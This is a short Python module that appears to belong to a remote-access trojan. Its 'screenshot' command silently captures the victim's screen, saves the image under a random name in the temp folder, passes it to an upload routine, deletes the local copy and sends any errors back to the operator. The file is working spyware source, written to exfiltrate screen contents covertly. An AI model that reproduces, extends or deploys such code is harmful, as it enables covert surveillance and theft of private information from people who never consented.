from PIL import ImageGrab
import os
import string
import random
import upload
import utils

def run():
    try:
        image = ImageGrab.grab()
        filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
        filename += ".jpg"
        filepath = os.path.join(os.environ['temp'], filename)
        image.save(filepath)
        upload.run(filepath)
        os.remove(filepath)
    except Exception, exc:
        utils.send_output(exc)


def help():
    help_text = """
Usage: screenshot
Captures screen.

"""
    return help_text
